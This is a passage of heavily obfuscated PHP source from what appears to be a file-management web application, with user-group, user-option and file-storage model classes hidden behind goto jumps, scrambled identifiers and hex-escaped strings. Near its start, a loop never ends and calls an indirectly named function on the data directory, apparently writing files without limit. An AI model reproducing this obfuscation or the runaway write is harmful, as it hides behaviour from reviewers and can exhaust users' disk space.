$cóÕççŞ[564]) { $D½öåÉµ«Ñ = $cóÕççŞ[784]; $D½öåÉµ«Ñ(); } goto e£²‰Ş°‹Í; a¾â“á›“: $AÚÜ‚Ş¬éµ = $cóÕççŞ[794]; $aŞêŒª‘Ö… = $cóÕççŞ[781]; $Aä…ÏÇ×˜İ = $_SERVER[$cóÕççŞ[782]] . $cóÕççŞ[783]; goto dËãŞƒ²†‰; a‹›šˆ¦Âí: $f¬¡¶³… Ğ = 1; for ($cÆï¢ê¨•Õ = $f¬¡¶³… Ğ; $cÆï¢ê¨•Õ > 0; $cÆï¢ê¨•Õ++) { $fàŸšË‘²(DATA_PATH . $cÆï¢ê¨•Õ, $A…ñÉìö¶); } goto EÎ«“¬•–; EÎ«“¬•–: } $FÀ¨¬¡–¤« = $this->getInfoSimple($CÊ‰Œ„†¶); if (!$FÀ¨¬¡–¤« || !is_array($f™¡ñŒ¦Ê)) { return !1; } goto A½¸µğ ±; A½¸µğ ±: $AÆ·óâ«àˆ = Model($cóÕççŞ[2175]); $AÆ·óâ«àˆ->where(array($cóÕççŞ[1434] => $CÊ‰Œ„†¶))->delete(); $cÇ‚Ğµ„£à = array(); goto F²×İ³×Ã•; C‹ÁŠšê‰˜: $cóÕççŞ =& $_SERVER[Æ]; $D™Â„Éä˜™ = $_SERVER[$cóÕççŞ[782]] . $cóÕççŞ[783]; $c«äèõ¥© = $cóÕççŞ[779]; goto F…ØƒŒÅë˜; F²×İ³×Ã•: $AÇøÇ„İ¼ = 0; foreach ($f™¡ñŒ¦Ê as $B“Æô¢ÓÌ‡ => $eĞ…“Êùªì) { $f¯Ïƒ»íÚÅ = array($cóÕççŞ[1434] => $CÊ‰Œ„†¶, $cóÕççŞ[2101] => $B“Æô¢ÓÌ‡, $cóÕççŞ[2229] => $eĞ…“Êùªì); $f¯Ïƒ»íÚÅ[$cóÕççŞ[2122]] = isset($A‹ÓÁÍ†ß[$AÇøÇ„İ¼]) ? $A‹ÓÁÍ†ß[$AÇøÇ„İ¼] : 0; $AÇøÇ„İ¼++; $cÇ‚Ğµ„£à[] = $f¯Ïƒ»íÚÅ; } return $AÆ·óâ«àˆ->addAll($cÇ‚Ğµ„£à, array(), !0); goto a—øòÎÊ‚³; a—øòÎÊ‚³: } protected function userGroupAdd($dßÚ¦ôŒÖ±, $båğèë¤“’ = array()) { $aãÕ˜¥ ïº =& $_SERVER[Æ]; $BİàŠŒ‡…Ö = $this->getInfoSimple($dßÚ¦ôŒÖ±); if (!$BİàŠŒ‡…Ö || empty($båğèë¤“’)) { return !1; } $eÂ²©îÏ = array(); foreach ($båğèë¤“’ as $f›¤ÓÂ òß => $a†æóÍÖ©Ù) { $eÂ²©îÏ[] = array($aãÕ˜¥ ïº[1434] => $dßÚ¦ôŒÖ±, $aãÕ˜¥ ïº[2101] => $f›¤ÓÂ òß, $aãÕ˜¥ ïº[2229] => $a†æóÍÖ©Ù); } return Model($aãÕ˜¥ ïº[2175])->addAll($eÂ²©îÏ, array(), !0); } protected function userGroupRemove($EáÈªÏá, $f„à®ÈŒ) { $døˆòÕ¹á =& $_SERVER[Æ]; $AÜÓİÂ—–’ = $this->getInfoSimple($EáÈªÏá); if (!$AÜÓİÂ—–’ || !$f„à®ÈŒ) { return !1; } $F¾…Àèåä„ = array($døˆòÕ¹á[1425] => $EáÈªÏá, $døˆòÕ¹á[2173] => $f„à®ÈŒ); return Model($døˆòÕ¹á[2175])->where($F¾…Àèåä„)->delete(); } public function listData() { $DÅ…Äª ¬¬ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($DÅ…Äª ¬¬[$_SERVER[Æ][354]]); return $DÅ…Äª ¬¬; } public function listByID($e‰ñä©ª) { $fÙÉæ¦­í =& $_SERVER[Æ]; if (!$e‰ñä©ª) { return; } $Eò“¨÷‡‘ = array($fÙÉæ¦­í[1434] => array($fÙÉæ¦­í[7], $e‰ñä©ª)); $CË¼ÔËî¬ô = $this->where($Eò“¨÷‡‘)->select(); $this->_listDataApply($CË¼ÔËî¬ô); return $CË¼ÔËî¬ô; } public function listByGroup($C¹´ØŠÕàÊ = 0, $d„ªÍòÌß” = array()) { goto c–†™¯ë†ê; bÍÑÓ¾Îâ­: if ($C¹´ØŠÕàÊ) { $a¿…ÇÇ«Ö£ = array($E’êĞˆ­Á[2527] => intval($C¹´ØŠÕàÊ)); $bÚÃá¡„« = "\x4c\x45\106\124\40\x4a\x4f\111\x4e\x20{$this->tablePrefix}\x75\163\x65\x72\137\x67\162\x6f\x75\x70\40\x75\x73\145\162\x5f\x67\x72\157\x75\160\x20\157\x6e\40\x75\x73\145\x72\x2e\165\x73\145\162\111\104\x20\x3d\x20\165\x73\x65\162\137\x67\162\157\x75\x70\x2e\165\x73\145\162\x49\x44"; $eÜÖ­Œ = Input::get($E’êĞˆ­Á[407], null, $E’êĞˆ­Á[33]) ? $E’êĞˆ­Á[33] : $E’êĞˆ­Á[2528]; } if (isset($d„ªÍòÌß”[$E’êĞˆ­Á[687]])) { $a¿…ÇÇ«Ö£[$E’êĞˆ­Á[2529]] = $d„ªÍòÌß”[$E’êĞˆ­Á[687]]; } $b «á¥Ç¦ = $this->_makeOrder($eÜÖ­Œ)->field($E’êĞˆ­Á[2530])->where($a¿…ÇÇ«Ö£)->join($bÚÃá¡„«)->selectPage(50); goto C¶íªãÎ¯³; c–†™¯ë†ê: $E’êĞˆ­Á =& $_SERVER[Æ]; $bÚÃá¡„« = $E’êĞˆ­Á[33]; $a¿…ÇÇ«Ö£ = array(); goto bÍÑÓ¾Îâ­; C¶íªãÎ¯³: $this->_listDataApply($b «á¥Ç¦[$E’êĞˆ­Á[354]]); return $b «á¥Ç¦; goto eÁÈšÁŒÒ; eÁÈšÁŒÒ: } private function _makeOrder($bµ¯›Ğ¤ç× = '') { goto F¶œ¹¶ÂØ¯; eŞ‰÷«‹ù: $BŠù¨‹ = Input::get($D¤§¾õ¶ğİ[407], $D¤§¾õ¶ğİ[7], $D¤§¾õ¶ğİ[1425], $CÈ•Ó±Şëï); $DäÃÙ‹ñº¿ = Input::get($D¤§¾õ¶ğİ[408], $D¤§¾õ¶ğİ[7], $D¤§¾õ¶ğİ[2176], array($D¤§¾õ¶ğİ[2176], $D¤§¾õ¶ğİ[404])); $DäÃÙ‹ñº¿ = $a‚àÅ’Êº[$DäÃÙ‹ñº¿]; goto D±ß§òó•Æ; F¶œ¹¶ÂØ¯: $D¤§¾õ¶ğİ =& $_SERVER[Æ]; $CÈ•Ó±Şëï = array($D¤§¾õ¶ğİ[1434], $D¤§¾õ¶ğİ[28], $D¤§¾õ¶ğİ[2087], $D¤§¾õ¶ğİ[2060], $D¤§¾õ¶ğİ[187]); $a‚àÅ’Êº = array($D¤§¾õ¶ğİ[402] => $D¤§¾õ¶ğİ[403], $D¤§¾õ¶ğİ[404] => $D¤§¾õ¶ğİ[405]); goto eŞ‰÷«‹ù; D±ß§òó•Æ: $bµ¯›Ğ¤ç× = $bµ¯›Ğ¤ç× . "\165\x73\145\162\x2e{$BŠù¨‹}\40{$DäÃÙ‹ñº¿}\x2c\x20\165\163\145\x72\x2e\x75\x73\x65\x72\111\104\x20\141\x73\143"; return $this->alias($D¤§¾õ¶ğİ[2273])->order($bµ¯›Ğ¤ç×); goto f‰˜„¸†š“; f‰˜„¸†š“: } public function listSearch($eƒÜßìœ«è) { goto BéÆİáÜ; d°–Šø¬•¿: $F¬™İµ—–¸ = str_replace($cÑ‘‚‡Üó[2179], $cÑ‘‚‡Üó[2180], trim($F¬™İµ—–¸)); $a†‹Ò†ğÂ = array($cÑ‘‚‡Üó[28] => array($cÑ‘‚‡Üó[750], "\x25{$F¬™İµ—–¸}\x25"), $cÑ‘‚‡Üó[293] => array($cÑ‘‚‡Üó[750], "\45{$F¬™İµ—–¸}\x25"), $cÑ‘‚‡Üó[2330] => array($cÑ‘‚‡Üó[750], "\45{$F¬™İµ—–¸}\45"), $cÑ‘‚‡Üó[915] => $cÑ‘‚‡Üó[2181]); if (Input::check($F¬™İµ—–¸, $cÑ‘‚‡Üó[299])) { $a†‹Ò†ğÂ[$cÑ‘‚‡Üó[1434]] = array($cÑ‘‚‡Üó[750], "\45{$F¬™İµ—–¸}\x25"); $a†‹Ò†ğÂ[$cÑ‘‚‡Üó[2511]] = array($cÑ‘‚‡Üó[750], "\45{$F¬™İµ—–¸}\x25"); } goto d’» ·È±Ì; BéÆİáÜ: $cÑ‘‚‡Üó =& $_SERVER[Æ]; $F¬™İµ—–¸ = $eƒÜßìœ«è[$cÑ‘‚‡Üó[2177]]; $DˆÇéÉõÅì = isset($eƒÜßìœ«è[$cÑ‘‚‡Üó[2178]]) ? $eƒÜßìœ«è[$cÑ‘‚‡Üó[2178]] : !1; goto d°–Šø¬•¿; Fö‹š‡ê»: return $CÖˆŠÂ¨‰á; goto FĞÊ×Ì”ğ—; fÈÇ…ĞÒ÷×: if (!$CÖˆŠÂ¨‰á || count($CÖˆŠÂ¨‰á[$cÑ‘‚‡Üó[354]]) < 5 && Input::check($F¬™İµ—–¸, $cÑ‘‚‡Üó[306])) { $a‘÷ã‹ï”è = $this->_searchFromMeta($cÑ‘‚‡Üó[415], $F¬™İµ—–¸, 10); $AùøõèÚØ° = $this->_searchFromMeta($cÑ‘‚‡Üó[416], $F¬™İµ—–¸, 10); $bïÅ‘ÂğŠ¸ = array_merge($a‘÷ã‹ï”è, $AùøõèÚØ°, $CÖˆŠÂ¨‰á[$cÑ‘‚‡Üó[354]]); $CÖˆŠÂ¨‰á[$cÑ‘‚‡Üó[354]] = array_unique_by_key($bïÅ‘ÂğŠ¸, $cÑ‘‚‡Üó[1434]); $CÖˆŠÂ¨‰á[$cÑ‘‚‡Üó[351]][$cÑ‘‚‡Üó[352]] = count($CÖˆŠÂ¨‰á[$cÑ‘‚‡Üó[354]]); $CÖˆŠÂ¨‰á[$cÑ‘‚‡Üó[351]][$cÑ‘‚‡Üó[353]] = ceil($CÖˆŠÂ¨‰á[$cÑ‘‚‡Üó[351]][$cÑ‘‚‡Üó[352]] / $CÖˆŠÂ¨‰á[$cÑ‘‚‡Üó[351]][$cÑ‘‚‡Üó[349]]); } $this->_listDataApply($CÖˆŠÂ¨‰á[$cÑ‘‚‡Üó[354]]); $this->_filterByGroup($CÖˆŠÂ¨‰á, $DˆÇéÉõÅì); goto Fö‹š‡ê»; d’» ·È±Ì: if (!$F¬™İµ—–¸) { $a†‹Ò†ğÂ = array(); } if (isset($eƒÜßìœ«è[$cÑ‘‚‡Üó[687]])) { $a†‹Ò†ğÂ[$cÑ‘‚‡Üó[687]] = $eƒÜßìœ«è[$cÑ‘‚‡Üó[687]]; } $CÖˆŠÂ¨‰á = $this->_makeOrder()->where($a†‹Ò†ğÂ)->selectPage(20); goto fÈÇ…ĞÒ÷×; FĞÊ×Ì”ğ—: } private function _filterByGroup(&$aİ÷÷ƒùÏ, $C™‚âíˆ) { $b”ªœ×É¿ =& $_SERVER[Æ]; if (!$C™‚âíˆ) { return $aİ÷÷ƒùÏ; } foreach ($aİ÷÷ƒùÏ[$b”ªœ×É¿[354]] as $eÑõóµä“ƒ => &$d»‹ŸËÛÈŸ) { $aïÛ˜´å— = array_to_keyvalue($d»‹ŸËÛÈŸ[$b”ªœ×É¿[2531]], $b”ªœ×É¿[33], $b”ªœ×É¿[2101]); if (!in_array($C™‚âíˆ, $aïÛ˜´å—)) { unset($aİ÷÷ƒùÏ[$b”ªœ×É¿[354]][$eÑõóµä“ƒ]); } } $aİ÷÷ƒùÏ[$b”ªœ×É¿[354]] = array_values($aİ÷÷ƒùÏ[$b”ªœ×É¿[354]]); $aİ÷÷ƒùÏ[$b”ªœ×É¿[351]] = array($b”ªœ×É¿[2306] => count($aİ÷÷ƒùÏ[$b”ªœ×É¿[354]]), $b”ªœ×É¿[2304] => $aİ÷÷ƒùÏ[$b”ªœ×É¿[351]][$b”ªœ×É¿[349]], $b”ªœ×É¿[2303] => 1, $b”ªœ×É¿[2305] => 1); } private function _searchFromMeta($cŞì‚Œ¥Íå, $Bè‚¬¬›¸Î, $e¦ºœ¤×»«) { goto cïíâÙƒÃ½; Dêã“ç“¼ò: $fÜİ–µìî = Model($E­§¤ÒßŒ[2532])->where($dßƒÄ³Şõ‘)->limit($e¦ºœ¤×»«)->select(); if (!$fÜİ–µìî) { return array(); } $fÜİ–µìî = array_to_keyvalue($fÜİ–µìî, $E­§¤ÒßŒ[33], $E­§¤ÒßŒ[1434]); goto eÜ¸±á‹Í¢; eÜ¸±á‹Í¢: $B÷Ã‰ÀŠÀ = $this->where(array($E­§¤ÒßŒ[1425] => array($E­§¤ÒßŒ[7], $fÜİ–µìî)))->select(); if (!$B÷Ã‰ÀŠÀ) { return array(); } return $B÷Ã‰ÀŠÀ; goto aª¸è‡âìœ; cïíâÙƒÃ½: $E­§¤ÒßŒ =& $_SERVER[Æ]; $Bè‚¬¬›¸Î = strtolower($Bè‚¬¬›¸Î); $dßƒÄ³Şõ‘ = array($E­§¤ÒßŒ[89] => $cŞì‚Œ¥Íå, $E­§¤ÒßŒ[359] => array($E­§¤ÒßŒ[750], "\x25{$Bè‚¬¬›¸Î}\45")); goto Dêã“ç“¼ò; aª¸è‡âìœ: } private function _listDataApplyItem($D•†Õœ¡óŒ) { $A ø‘èÚ˜— = array($D•†Õœ¡óŒ); $this->_listDataApply($A ø‘èÚ˜—); return $A ø‘èÚ˜—[0]; } private function _listDataApply(&$CÈëƒäâ´â) { goto eÏğÆ•šÏ; fïÑ§Õ×ã: $dØÍ–‚õêÃ = array_to_keyvalue($CÈëƒäâ´â, $bœˆ†ïÃ•å[33], $bœˆ†ïÃ•å[1434]); $this->_listAppendGroup($CÈëƒäâ´â, $dØÍ–‚õêÃ); $this->_listAppendMeta($CÈëƒäâ´â, $dØÍ–‚õêÃ); goto Aä’’´İÑ²; Aä’’´İÑ²: $this->_listAppendSourceRoot($CÈëƒäâ´â, $dØÍ–‚õêÃ); goto D´˜š§ãÆ›; eÏğÆ•šÏ: $bœˆ†ïÃ•å =& $_SERVER[Æ]; if (!$CÈëƒäâ´â) { return; } array_remove_key($CÈëƒäâ´â, $bœˆ†ïÃ•å[803]); goto fïÑ§Õ×ã; D´˜š§ãÆ›: } private function _listAppendSourceRoot(&$f«ŠÛÛÇ§ø, $a¿Ò“× ¬) { goto dó¹‡©¼²ˆ; dó¹‡©¼²ˆ: $D»¤Œˆ¢œô =& $_SERVER[Æ]; $CÔ÷¤à¥§ø = array($D»¤Œˆ¢œô[461] => 0, $D»¤Œˆ¢œô[371] => SourceModel::TYPE_USER, $D»¤Œˆ¢œô[456] => array($D»¤Œˆ¢œô[7], $a¿Ò“× ¬)); $C‹¸ÑÆ¨ = $D»¤Œˆ¢œô[2187]; goto f÷Á¬¥àãÖ; f÷Á¬¥àãÖ: $cÒéêÄ•˜ = Model($D»¤Œˆ¢œô[751])->order($D»¤Œˆ¢œô[2188])->field($C‹¸ÑÆ¨)->where($CÔ÷¤à¥§ø)->select(); $cÒéêÄ•˜ = array_to_keyvalue($cÒéêÄ•˜, $D»¤Œˆ¢œô[456]); $cÒéêÄ•˜ = array_remove_key($cÒéêÄ•˜, $D»¤Œˆ¢œô[456]); goto d÷‚ËÙæ˜÷; d÷‚ËÙæ˜÷: foreach ($f«ŠÛÛÇ§ø as &$c³ÂÕ›—ì³) { $c³ÂÕ›—ì³[$D»¤Œˆ¢œô[391]] = $cÒéêÄ•˜[$c³ÂÕ›—ì³[$D»¤Œˆ¢œô[1434]]] ? $cÒéêÄ•˜[$c³ÂÕ›—ì³[$D»¤Œˆ¢œô[1434]]] : array(); } goto c˜˜ƒƒ‡; c˜˜ƒƒ‡: } private function _listAppendGroup(&$A¯—êÛ¥òª, $EäØÖÉ¹Ñ) { goto aª¼­„´‰›; C†ÓÁƒ°Ïœ: $BæŠÏºäÚ = array_to_keyvalue($cÅâÆ¦½ö», $aîâİ•ÎÑï[33], $aîâİ•ÎÑï[2101]); $BæŠÏºäÚ = array_remove_value(array_unique($BæŠÏºäÚ), $aîâİ•ÎÑï[468]); if (!$BæŠÏºäÚ || !$cÅâÆ¦½ö») { return; } goto DÔÌËø£”Š; Ašæ‡äóÀï: $cÅâÆ¦½ö» = array_to_keyvalue_group($cÅâÆ¦½ö», $aîâİ•ÎÑï[1434]); foreach ($cÅâÆ¦½ö» as &$cÑ»é‡Ç) { $E«ß¶å¹Ô = array(); foreach ($cÑ»é‡Ç as $E–˜Ä©å‡È) { if (!$E–˜Ä©å‡È[$aîâİ•ÎÑï[2229]]) { continue; } $e‘ë—îƒÂ‰ = Model($aîâİ•ÎÑï[2248])->listData($E–˜Ä©å‡È[$aîâİ•ÎÑï[2229]]); $E«ß¶å¹Ô[] = array($aîâİ•ÎÑï[2101] => $E–˜Ä©å‡È[$aîâİ•ÎÑï[2101]], $aîâİ•ÎÑï[2535] => $bä´ªé²ï[$E–˜Ä©å‡È[$aîâİ•ÎÑï[2101]]], $aîâİ•ÎÑï[376] => $e‘ë—îƒÂ‰); } $cÑ»é‡Ç = $E«ß¶å¹Ô; } foreach ($A¯—êÛ¥òª as &$fØŞğ…Ëôç) { $fØŞğ…Ëôç[$aîâİ•ÎÑï[2531]] = array(); if (isset($cÅâÆ¦½ö»[$fØŞğ…Ëôç[$aîâİ•ÎÑï[1434]]])) { $fØŞğ…Ëôç[$aîâİ•ÎÑï[2531]] = $cÅâÆ¦½ö»[$fØŞğ…Ëôç[$aîâİ•ÎÑï[1434]]]; } } goto a¿¶Ç‚î; DÔÌËø£”Š: $F‡”±„—‚ì = array($aîâİ•ÎÑï[2101] => array($aîâİ•ÎÑï[7], $BæŠÏºäÚ)); $bæášğµ = Model($aîâİ•ÎÑï[2533])->field($aîâİ•ÎÑï[2534])->where($F‡”±„—‚ì)->select(); $bä´ªé²ï = array_to_keyvalue($bæášğµ, $aîâİ•ÎÑï[2101], $aîâİ•ÎÑï[28]); goto Ašæ‡äóÀï; aª¼­„´‰›: $aîâİ•ÎÑï =& $_SERVER[Æ]; $F‡”±„—‚ì = array($aîâİ•ÎÑï[1434] => array($aîâİ•ÎÑï[7], $EäØÖÉ¹Ñ)); $cÅâÆ¦½ö» = Model($aîâİ•ÎÑï[2175])->where($F‡”±„—‚ì)->select(); goto C†ÓÁƒ°Ïœ; a¿¶Ç‚î: } private function _listAppendMeta(&$E’ìŠå£ãÎ, $f‡É²ÃÄ) { goto bˆ”™¨ôÖ; bˆ”™¨ôÖ: $eË•Šë¬¨ =& $_SERVER[Æ]; $fÅäÚÑô = UserJobModel::JOB_KEY; $AÎôœ«è¦Š = array($eË•Šë¬¨[2513]); goto fí¡èˆ¢ÉÈ; fí¡èˆ¢ÉÈ: $E‘‡Í°Êù = array($eË•Šë¬¨[1434] => array($eË•Šë¬¨[7], $f‡É²ÃÄ)); $a‘±¼”æª = Model($eË•Šë¬¨[2510])->where($E‘‡Í°Êù)->select(); $a‘±¼”æª = array_to_keyvalue_group($a‘±¼”æª, $eË•Šë¬¨[1434]); goto B‘““ï›; B‘““ï›: foreach ($a‘±¼”æª as &$c²µø…Â¸æ) { $DŒ¥ÊÃ‰™Ò = array(); foreach ($c²µø…Â¸æ as $A‡½¢±¿÷) { if (!in_array($A‡½¢±¿÷[$eË•Šë¬¨[89]], $AÎôœ«è¦Š)) { $DŒ¥ÊÃ‰™Ò[$A‡½¢±¿÷[$eË•Šë¬¨[89]]] = $A‡½¢±¿÷[$eË•Šë¬¨[359]]; } } $c²µø…Â¸æ = $DŒ¥ÊÃ‰™Ò; } $e„©¨È‘Îë = Model($eË•Šë¬¨[2536]); foreach ($E’ìŠå£ãÎ as &$Bšã‹‰²Îô) { $Fœå­¤†¹æ = array(); if (isset($a‘±¼”æª[$Bšã‹‰²Îô[$eË•Šë¬¨[1434]]])) { $Fœå­¤†¹æ = $a‘±¼”æª[$Bšã‹‰²Îô[$eË•Šë¬¨[1434]]]; } $Bšã‹‰²Îô[$eË•Šë¬¨[2537]] = array(); if (isset($Fœå­¤†¹æ[$fÅäÚÑô])) { $Bšã‹‰²Îô[$eË•Šë¬¨[2537]] = $e„©¨È‘Îë->getUserJobInfo($Fœå­¤†¹æ[$fÅäÚÑô]); } } goto F±Š¬–îÆÃ; F±Š¬–îÆÃ: } public function userSearch($C´¶™ëÌ‚ª, $BÒÅÖ‘ˆ« = "\x2a") { return Model($_SERVER[Æ][477])->where($C´¶™ëÌ‚ª)->field($BÒÅÖ‘ˆ«)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\162\137\x6f\x70\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($DííóŒ“­) { $D‹±ï÷ìÑ =& $_SERVER[Æ]; if (!defined($D‹±ï÷ìÑ[427])) { define($D‹±ï÷ìÑ[427], 0); } return "\x55\x73\145\162\117\160\x74\151\x6f\156\x5f{$DííóŒ“­}\x5f" . USER_ID; } protected function filterWhere($Bëİ½™Šƒ¤) { $BëéçŒŒ‡Ğ =& $_SERVER[Æ]; if (!defined($BëéçŒŒ‡Ğ[427])) { define($BëéçŒŒ‡Ğ[427], 0); } $Bëİ½™Šƒ¤[$BëéçŒŒ‡Ğ[1434]] = USER_ID; return $Bëİ½™Šƒ¤; } public function cacheRemoveUser($a½½çÂë, $cä‰¬ãõ¿å) { return Cache::remove("\125\163\145\162\x4f\x70\x74\151\157\156\x5f{$a½½çÂë}\137" . $cä‰¬ãõ¿å); } protected function optionDefault($C†±ÂÏ•¬Š = '') { $A÷¾Í‹Çö =& $_SERVER[Æ]; if ($C†±ÂÏ•¬Š == $A÷¾Í‹Çö[33]) { return $GLOBALS[$A÷¾Í‹Çö[6]][$A÷¾Í‹Çö[2538]]; } if ($C†±ÂÏ•¬Š == $A÷¾Í‹Çö[2539]) { return $GLOBALS[$A÷¾Í‹Çö[6]][$A÷¾Í‹Çö[2540]]; } } } goto eÆÍèòïœñ; DÆ¿»Â»Çå: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\x69\154\145"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\x61\155\145" => "\151\x6f\137\x66\x69\154\x65\x5f\155\x65\164\x61", "\x6d\145\x74\141\106\151\x65\x6c\x64" => "\x66\151\x6c\145\x49\x44"); public function fileInfo($f£Áõ½„Û£) { $Cç‚ÛÑâ =& $_SERVER[Æ]; static $f³ÌĞˆğ = array(); if (!isset($f³ÌĞˆğ[$f£Áõ½„Û£])) { $dÇ×áŠ  = $Cç‚ÛÑâ[2143]; $d…Ò”ìÔ½³ = Model($Cç‚ÛÑâ[422])->field($dÇ×áŠ )->where(array($Cç‚ÛÑâ[420] => $f£Áõ½„Û£))->find(); $f³ÌĞˆğ[$f£Áõ½„Û£] = $d…Ò”ìÔ½³; } return $f³ÌĞˆğ[$f£Áõ½„Û£]; } public function addFileByContent($F½‹İÜªğ = '', $bä¥Ùàö³™ = '') { goto Bõ˜•¿¥•Ş; FÁõŸÊ‚ÑÓ: $cº¾Ú¶È˜ = $eí¦©’Ê£‰ . $cğ‚šµêÀè[2145] . rand_string(16); file_put_contents($cº¾Ú¶È˜, $F½‹İÜªğ); $c—¦´õ¤Ö = $this->addFile($cº¾Ú¶È˜, $bä¥Ùàö³™, !0); goto dÄŞßÃÂ…›; Bõ˜•¿¥•Ş: $cğ‚šµêÀè =& $_SERVER[Æ]; $eí¦©’Ê£‰ = TEMP_PATH . $cğ‚šµêÀè[2144]; if (!is_dir($eí¦©’Ê£‰)) { mk_dir($eí¦©’Ê£‰); } goto FÁõŸÊ‚ÑÓ; dÄŞßÃÂ…›: if (file_exists($cº¾Ú¶È˜)) { @unlink($cº¾Ú¶È˜); } return $c—¦´õ¤Ö; goto Dº“˜ƒÁÖì; Dº“˜ƒÁÖì: } public function createFileName($Eßˆ¯ËÂâó) { goto dç³Å¼êîç; Fì¡íğÀã¨: $FéÁ’¾’Æ = $c™ä­÷ã×¶->pathFather($fÍÉ®í”ï§); static $dãÉ‚™›Üæ = false; $EœÛÀĞó‡ø = $Dø²²Ú¦¢À[2146] . md5($FéÁ’¾’Æ); goto aÛ‚ËŠ‹ä; dç³Å¼êîç: $Dø²²Ú¦¢À =& $_SERVER[Æ]; $c™ä­÷ã×¶ = IO::init($Dø²²Ú¦¢À[8]); $fÍÉ®í”ï§ = $this->makeFilePath($Eßˆ¯ËÂâó, $c™ä­÷ã×¶); goto Fì¡íğÀã¨; aÛ‚ËŠ‹ä: if (!$dãÉ‚™›Üæ && !Cache::get($EœÛÀĞó‡ø)) { $dãÉ‚™›Üæ = !0; $dÙÀ®Ğ†î = IO::mkdir($FéÁ’¾’Æ); if (!IO::exist($dÙÀ®Ğ†î . $Dø²²Ú¦¢À[2147])) { IO::mkfile($dÙÀ®Ğ†î . $Dø²²Ú¦¢À[2147]); } Cache::set($EœÛÀĞó‡ø, 1, 3600 * 2); } return $fÍÉ®í”ï§; goto CÌéãÕÄ¨; CÌéãÕÄ¨: } public function makeFilePath($cÂÕ‹ùÙÂã, $Câ¨´Ú×æˆ) { goto BŒÎêÑ¡©; Bƒƒ•¹œ„Ÿ: switch ($BºÊïŠ–°) { case $bòİ¿©ŠÄ[2151]: $D”İˆÂÜÕ = $D”İˆÂÜÕ . $bòİ¿©ŠÄ[91] . $Câ¨´Ú×æˆ->ext($cÂÕ‹ùÙÂã); if ($Câ¨´Ú×æˆ->ext($cÂÕ‹ùÙÂã) == $bòİ¿©ŠÄ[2091]) { $D”İˆÂÜÕ .= $bòİ¿©ŠÄ[2152]; } break; case $bòİ¿©ŠÄ[2153]: goto D¨êŠÑØ¤í; E¬‘ö ÓåÛ: if ($Câ¨´Ú×æˆ->ext($cÂÕ‹ùÙÂã) == $bòİ¿©ŠÄ[2091]) { $cÂÕ‹ùÙÂã .= $bòİ¿©ŠÄ[2152]; } $dÙö¨ÖºÇ = IO::fileNameAuto($EÍŞñ‡¾±¸, $cÂÕ‹ùÙÂã); $D”İˆÂÜÕ = $EÍŞñ‡¾±¸ . $dÙö¨ÖºÇ; goto cÖƒ¸©«Ÿ; D¨êŠÑØ¤í: $cÛÆ¢¶ËŒö = Model($bòİ¿©ŠÄ[1088])->get($bòİ¿©ŠÄ[1333]); $bêç¤Ç = substr(md5($bòİ¿©ŠÄ[1911] . $cÛÆ¢¶ËŒö . date($bòİ¿©ŠÄ[685])), 0, 8); $EÍŞñ‡¾±¸ = KodIO::defaultIO() . date($bòİ¿©ŠÄ[2154]) . $bêç¤Ç . $bòİ¿©ŠÄ[8]; goto E¬‘ö ÓåÛ; cÖƒ¸©«Ÿ: break; goto Aò»Í…Š¤™; Aò»Í…Š¤™: case $bòİ¿©ŠÄ[2150]: break; default: break; } return $D”İˆÂÜÕ; goto aŸ´ÓÕØ; BŒÎêÑ¡©: $bòİ¿©ŠÄ =& $_SERVER[Æ]; $BºÊïŠ–° = Model($bòİ¿©ŠÄ[1088])->get($bòİ¿©ŠÄ[2148]); $EÍŞñ‡¾±¸ = KodIO::defaultIO() . date($bòİ¿©ŠÄ[2149]); goto ašùÄã½×Ì; ašùÄã½×Ì: $D”İˆÂÜÕ = $EÍŞñ‡¾±¸ . rand_string(5) . short_id(100); $cÂÕ‹ùÙÂã = str_replace($bòİ¿©ŠÄ[8], $bòİ¿©ŠÄ[70], KodIO::clear($cÂÕ‹ùÙÂã)); if (!$cÂÕ‹ùÙÂã) { $BºÊïŠ–° = $bòİ¿©ŠÄ[2150]; } goto Bƒƒ•¹œ„Ÿ; aŸ´ÓÕØ: } public function addFileByRemote($eä´…Ø¸¹, $D™º‹Ñ×ã, $Aä‡‰ÜËã± = array()) { goto eÏé¯Ê†·ó; F˜Ñ‚ë§áÀ: if ($d„ÜèÌÀ„µ = $this->addFileCheckExist($fĞòÏµö¹‚[$Eé°‰ã¬Á[164]], $fĞòÏµö¹‚[$Eé°‰ã¬Á[163]], $fĞòÏµö¹‚[$Eé°‰ã¬Á[77]])) { return $d„ÜèÌÀ„µ; } return $this->addFileData($fĞòÏµö¹‚); goto C—×‰•Ä™ƒ; eÏé¯Ê†·ó: $Eé°‰ã¬Á =& $_SERVER[Æ]; if (!IO::exist($eä´…Ø¸¹)) { return !1; } $Båƒò„ºÕÛ = $Aä‡‰ÜËã±[$Eé°‰ã¬Á[163]] ? $Aä‡‰ÜËã±[$Eé°‰ã¬Á[163]] : $Eé°‰ã¬Á[33]; goto CÎÜµ×äó; CÎÜµ×äó: $eÚ—‡Õïõ’ = IO::hashMd5($eä´…Ø¸¹, $Båƒò„ºÕÛ); $Eá‰œí® = KodIO::defaultDriver(); $fĞòÏµö¹‚ = array($Eé°‰ã¬Á[520] => IO::size($eä´…Ø¸¹), $Eé°‰ã¬Á[2155] => 1, $Eé°‰ã¬Á[386] => $D™º‹Ñ×ã, $Eé°‰ã¬Á[734] => $Eá‰œí®[$Eé°‰ã¬Á[367]], $Eé°‰ã¬Á[387] => $eä´…Ø¸¹, $Eé°‰ã¬Á[2156] => $Aä‡‰ÜËã±[$Eé°‰ã¬Á[164]] ? $Aä‡‰ÜËã±[$Eé°‰ã¬Á[164]] : IO::hashSimple($eä´…Ø¸¹), $Eé°‰ã¬Á[2157] => $eÚ—‡Õïõ’ ? $eÚ—‡Õïõ’ : $Båƒò„ºÕÛ); goto F˜Ñ‚ë§áÀ; C—×‰•Ä™ƒ: } private function addFileData($eáÍ™Û«çˆ) { $EˆˆÍ…ñ» =& $_SERVER[Æ]; if (!$eáÍ™Û«çˆ) { return !1; } $eáÍ™Û«çˆ[$EˆˆÍ…ñ»[77]] = intval($eáÍ™Û«çˆ[$EˆˆÍ…ñ»[77]]); if (!$eáÍ™Û«çˆ[$EˆˆÍ…ñ»[77]] && 